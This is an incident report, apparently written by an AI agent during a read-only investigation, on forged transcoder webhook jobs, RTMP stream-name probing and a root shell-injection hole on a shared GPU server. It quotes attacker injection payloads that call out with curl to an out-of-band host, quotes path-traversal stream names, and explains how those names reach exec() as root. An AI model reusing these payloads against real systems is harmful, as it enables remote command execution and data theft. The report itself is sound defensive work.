# GPU box: forged transcoder jobs, RTMP probing and a shell-injection hole (2026-10-29)

Tenant: shared infrastructure. The GPU/transcoder box `178.63.88.34` serves quicktricks (472), SelectionWay (561),
client 168, Futurekul, Powermind and others. Investigation was read-only. Nothing was killed, edited or deployed.

## Verdict

- **Incident: no evidence of compromise.** None of the payloads ran. No publish name with shell characters appears
  in any livestream log. The box shows no new users, no new cron jobs and no strange processes. The one recent
  `authorized_keys` change is the ops-console key, added 10-21.
- **Exposure: CRITICAL.** The forged jobs are not the worst problem. The live RTMP servers on this box put the
  publisher-chosen stream name into a shell command that runs as root. Publishing needs no auth, and the RTMP ports
  are open to the internet. Two different actors have already probed those ports with crafted stream names
  (10-09 and 10-19). Fix this first.

| # | Finding | Severity | Exercised? |
|---|---|---|---|
| A | RTMP stream name → `exec()` as root (`streamLifecycle.js`, `StreamMonitor.js`) on 4 of 5 live servers | Critical | Not by shell characters. Ports + paths probed |
| B | RTMP stream name → path traversal on disk (root writes outside the media root) | High | Yes, 10-09 (empty dirs) |
| C | Livestream REST API `/api/v1/room`, `/message`: no auth on list, create or delete | High | Yes: full room list pulled 4×, rooms created and deleted |
| D | B2 webhook `POST /b2/webhook` (port 3011): no auth, open to the internet → forged jobs | Medium | Yes, 7 jobs |
| E | `exec(ls -R "<dir from key>")` in the B2 job image → `$(...)` in an object key runs | Medium (needs an object in our bucket) | Attempted. Never reached |
| F | Nested-path publish orphans an ffmpeg per publish | Low (DoS lever) | Yes, 2 orphans running |

## Actors and timeline (UTC; box logs are CEST until 10-25)

**Actor 1: `107.150.27.113`** (HostPapa VPS, US). User agents `e838-probe`, `e838`, `curl/8.21.0`,
`Python-urllib/3.14`. Canary names carry an epoch suffix, for example `e838canary-1792412202` = 10-19 12:16:42Z.
Out-of-band host: `dbb0fi6ps0ls3cakt1j04jbo6nsdt6r49.oast.online` (Interactsh).

| UTC | What |
|---|---|
| 10-18 04:33–07:20 | HTTP :80 wordlists for a *data-masking/tokenization* API (`/mask`, `/tokenize`, `/card`, `/pan`, `/ssn`): a tool briefed for some other kind of target |
| 10-18 23:13 | `/api/v1/*` enumeration on the livestream API (nginx → :3001). `GET /api/v1/room` ×3 at **10.1 MB each**. `POST /api/v1/message` 200 |
| 10-19 07:49–08:00 | Round `e785`: create rooms, post messages, delete rooms, all with no auth. Cleans up after itself |
| 10-19 12:04–12:25 | Round `e838`: ~600 endpoint guesses. `POST /api/v1/stream` ×13 → 200. Rooms `e838iso*` created and deleted. Room list pulled again (10.19 MB) |
| 10-19 12:12–12:35 | RTMP connects: :1935 ×10 (pm2 3 `=selectionway-livestream`), plus one each on :8936, :8935, :8937, :8938. Publishes `/live/e838pub…` ×2 and `/live/e838rt1…`, `/live/514/e838rt2…`, `/live/live/e838rt3…` |
| 10-19 12:16:44–12:23:39 | Forged B2 webhook events sent straight to **:3011** (zero `/b2/webhook` lines in nginx that day). 7 jobs queued |
| 10-19 12:43:22–12:43:51 | Manager runs 6 of them. Each container exits code 1 within about 1 s. One stays `queued` (`job-1792412205917-…`) |

The webhook payloads carry no source IP: the listener does not log one, and the requests bypassed nginx. They are
tied to 107.150.27.113 by the shared `e838` marker and epoch, the same oast host and the same minutes. That link
is an inference, but a strong one.

**Actor 2: `193.32.127.228`** (31173 Services AB, Zürich; Mullvad VPN infrastructure). On 10-09 02:12–02:18Z it
published to :1935, :8936 and :8935 with stream names `/live/../../../../tmp/ztest`, `/live/..%2F..%2Fztest`,
`/live/z/../ztest`, `/live/cache.php`, `/live/../cache.php` and `/live/ztest.php`. This is a different tool
(`streamId=0`, `flashVer FMLE/3.0`). It created `/home/tmp/ztest/{0..3}` and
`/home/ubuntu/shared/livestream-files/cache.php/{0..3}`, both outside the media folder. Both are empty.

Background noise left out: `104.23.170.110` (Cloudflare edge, `.env` scanner, 10-16) and `94.154.43.99` (router
CGI scanner). They matched "e838" only by chance.

## 1. B2 webhook: auth, reachability, logs

- **No auth.** `startB2WebhookServer` (`src/index.ts:672`) takes any JSON. It has no signature check, although
  B2 event notifications support HMAC signing (`x-bz-event-notification-signature`), and no source allowlist.
  The handler accepts three shapes (array, `{events}`, bare object), and `processB2Event` trusts `bucketName` and
  `objectName`.
- **Port: 3011, not 3001.** pm2 14 `b2-video-listener` (`/root/video-transcoder/dist/index.js`, `ENV_FILE=.env.b2`)
  listens on `*:3011`. Port 3001 is pm2 1 `general-clients-streaming`, the livestream API.
- **Who can reach it: anyone.** ufw rule `3011/tcp ALLOW IN Anywhere  # b2-video-listener webhook` (v4 and v6).
  The nginx vhost `b2-event.multistreaming.site:80` also proxies `/` → `localhost:3011`.
- **Logs:** `/root/.pm2/logs/b2-video-listener-out.log` lines 4648–4762 hold every raw payload. There are no
  timestamps; times come from Mongo `transcoder.videos.queuedAt`. Payload variants: the B2 shape, an S3
  `records[]` shape, and objects with extra `url`/`downloadUrl` pointing at oast.online (SSRF probes). The
  listener never fetches those fields. Injection targets: `objectName` and `bucketName` carried
  `;curl${IFS}http://…oast.online/…;` and `x$(curl${IFS}…)`.
- Start and stop: first canary 12:16:42Z (epoch in the key), last job 12:23:39Z.

## 2. Could a payload have executed?

Path of `key` / `bucketName` / `clientId`:

1. **Listener** (`src/index.ts`): no shell. `getMediaInfoB2` uses `spawn('ffprobe', [args])`, and only for
   `mp4CleanUp` clients. `clientId = key.split('/')[0]` is used only as a lookup key, and the job goes onto Redis
   as JSON.
2. **Manager** (pm2 13 `b2-secure-job-manager`): dockerode, with job fields passed as container **env vars**
   (`KEY`, `BUCKET_NAME`, `CLIENT_ID`). There is no `exec` or `shell` in `manager.js`. The only `execSync` is the
   fixed `git rev-parse` in `preflight-secured.js`.
3. **Job image** `video-processor-b2-secure:v2` (`0f11d27be3ba`, 5 months old). `index.js:360` runs
   `exec(\`ls -R "${hlsOutputDir}"\`)`, where `hlsOutputDir = public/hls_output/<basename(KEY)>_<ts>`. Inside
   double quotes, `$(...)` and backticks expand; `;` does not. A `"` in the key would break out entirely. The line
   is reached only after **(a)** `GetObject(BUCKET_NAME, KEY)` succeeds with our B2 key **and (b)** the ffmpeg HLS
   pass exits 0.

**Verdict: not executed.** The buckets `hranker.test` and `tempvideos.hranker.test` do not exist in our account,
and names containing `;` are invalid. So `downloadFromS3` failed and every container exited 1 in under a second,
long before line 360. The `x$(curl…)` key would have fired only if an object with that exact name existed in a
bucket our key can read. To get there, an attacker needs upload access to `tempvideos-hranker`, for example via an
admin presigned PUT with a filename they choose. That is the residual risk. Repo HEAD `container/index.js` no
longer has this `exec`, but the deployed B2 image predates the change.

**The bigger hole is in livestream, not the transcoder (finding A).**
`/root/livestream-gpu/backend/lib/streamLifecycle.js:389`, and the same file in `livestream-futurekul`,
`-futurekul-obs` and `-futurekul-obs-2`, builds this command and passes it to `exec()`:

```
ffmpeg … -i "${config.rtmpUrl}${StreamPath}" … "${config.videoSaveBasePath}${StreamPath}/%v/playlist.m3u8"
```

`ps` shows it runs as `/bin/sh -c ffmpeg …` under root. `StreamPath` is `/<app>/<publish name>`, exactly what
the RTMP client sends. `lib/StreamMonitor.js:46`, present in all five instances, also runs
`` exec(`ffprobe … ${rtmpUrl}`) `` on a `setInterval`, and there the value is not even quoted. With no publish
auth and :1935 and :8935–8938 open to Anywhere, anyone on the internet can very likely run commands as root on
the GPU box. That box holds R2/B2/Mongo/Redis credentials for every tenant. This was **not tested**, because the
investigation was read-only.

Evidence it was not used: no `[rtmp publish] New stream` line with `$ \` ; | & ( ) < > " * { }` in its
`streamPath` appears in `-selectionway-livestream-out.log` (back to 2026-01-07, 1.85 GB) or in the out-logs of
`general-clients-streaming`, `futurekul`, `futurekul-obs` or `-livestream-powermind-2`. The caveat: a successful
root attacker could edit those logs. The IOC sweep found nothing either: no users added (only `root`, `medwiki`,
`raghav` can log in), crontab unchanged since 09-02, `/tmp` and `/dev/shm` clean, and no curl/nc/oast processes.

`StreamPath` also feeds the HLS output folder, which is how 10-09's `../` names created folders outside the media
root (finding B).

## 3. The RTMP sessions

- **Publisher:** `107.150.27.113` → :1935, pm2 3 `=selectionway-livestream` (`/root/livestream-gpu`, SelectionWay
  561's GPU encoder). `[rtmp connect] id=J7LE9V0J ip=::ffff:107.150.27.113` at 12:31:07Z. Publishes `rt1`
  12:31:29Z, `rt2` (`/live/514/…`) 12:32:15Z, `rt3` (`/live/live/…`) 12:33:02Z, each about 22 s long.
- **Why two are still running:** for a nested path, the internal pull `rtmp://localhost/live/514/e838…` is parsed
  as a different stream ("Stream not found … /live514/…"), so ffmpeg sits on an open socket. When the publish
  closed, node killed the `exec` shell (it logs `[FFMPEG EXIT]`), but the ffmpeg grandchild was re-parented to
  PID 1. `rt1` had a flat path and exited cleanly.
- **Still running on 10-29:** PIDs `989001` (rt2) and `989568` (rt3), started 12:32:16Z and 12:33:02Z, 10 days old.
- **Cost:** about zero. Each uses 0.0% CPU, 45 MB RSS and 1 thread, holds **no GPU memory** (it is not in
  `nvidia-smi`), keeps one loopback socket to :1935, and has empty output folders (20 KB). Node no longer counts
  them as transcoders. The risk is the pattern, not these two: every nested-path publish leaks one ffmpeg, so a
  loop of publishes is a cheap memory-exhaustion attack (finding F).

## 4. Was this our own test?

**No.** The user confirmed on 10-29 that it was not their test, so treat it as hostile. Nothing in memory or system-brain records a planned test, and no local
Claude session transcript contains these markers. Signs of an automated pentest agent: per-round canary prefixes
with epoch suffixes, tidy DELETEs after each create, Interactsh callbacks, and a 10-18 wordlist aimed at a
different kind of service, as if the tool was scoped to some other target and found our IP. Signs it was not
ours: a HostPapa VPS, and the 10-09 traversal round from Mullvad VPN, which is a second, unrelated tool.

## Proposed fixes (none applied; each needs the user's OK)

Ordered by risk:

1. **RTMP publish gate (A, B, F).** In every livestream instance's `prePublish`, reject any `StreamPath` not
   matching `^/[A-Za-z0-9_-]+/[A-Za-z0-9_-]+$`, then `session.reject()`. Ideally also require a signed publish key
   (the deferred "RTMP publish auth" in memory). This one change closes A, B and F.
2. **Replace `exec` with `spawn('ffmpeg', args)`** in `lib/streamLifecycle.js` and with `execFile('ffprobe', [...])`
   in `lib/StreamMonitor.js`, in all five checkouts. This also fixes the orphaning, because the PID becomes
   ffmpeg's own PID and not a shell's.
3. **Firewall:** limit :1935 and :8935–8938 to the encoders' known ingest sources where possible. OBS teachers
   publish from home IPs, so (1) has to come first.
4. **Livestream REST API auth (C):** `GET /api/v1/room` returns every room (`clientId`, `classId`, `streamPath`,
   `vodPath`) to anyone. Together with no publish auth, that lets a stranger publish into any real class.
   Room/message create and delete need a server token.
5. **B2 webhook (D):** verify B2's HMAC signature header with a signing secret set on the bucket notification rule,
   and reject events whose `bucketName` is not on an allowlist (`tempvideos-hranker`, …) or whose key fails
   `^\d+/[^/]+/[A-Za-z0-9._ -]+$`. Then drop the ufw `3011` rule and leave only nginx on 80/443, or allowlist
   Backblaze's egress.
6. **Job image (E):** rebuild `video-processor-b2-secure` without the `exec(ls -R …)` (use `fs.readdir`, or drop
   it), as repo HEAD already does.
7. **Clean-up** (approved actions only): `kill 989001 989568`; mark the queued job
   `job-1792412205917-e838canary-1792412202.mp4-undefined` failed, and `LREM` it from Redis `queue:normal` if it
   is still there; remove the empty `/home/tmp/ztest`, `…/livestream-files/cache.php`, `…/live/cache.php`,
   `…/live/ztest*`, `…/live/514`, `…/live/live`, `…/live/e838*` and `…/live/..%2F..%2Fztest`.
8. **Logging:** add the source IP and a timestamp to the B2 listener's `[B2] Raw payload` line.

Side note: `/root/.pm2/logs/b2-secure-job-manager-out.log` is 29 GB and has no pm2-logrotate.

## Evidence locations

- nginx: `/var/log/nginx/access.log.{1..10}` (10-18 to 10-28). Actor lines copied to the session scratchpad only.
- Listener: `/root/.pm2/logs/b2-video-listener-out.log:4648-4762`.
- Jobs: Mongo `transcoder.videos`, `_id` prefixes `job-17924122…` and `job-17924126…` (7 docs).
- RTMP: `/root/.pm2/logs/-selectionway-livestream-out.log:23413370-23413534` (10-19) and the 10-09 lines that
  match `ztest|cache.php`.
- Sinks: `/root/livestream-gpu/backend/lib/streamLifecycle.js:389`, `lib/StreamMonitor.js:46`; image
  `video-processor-b2-secure:v2:/app/index.js:360`.
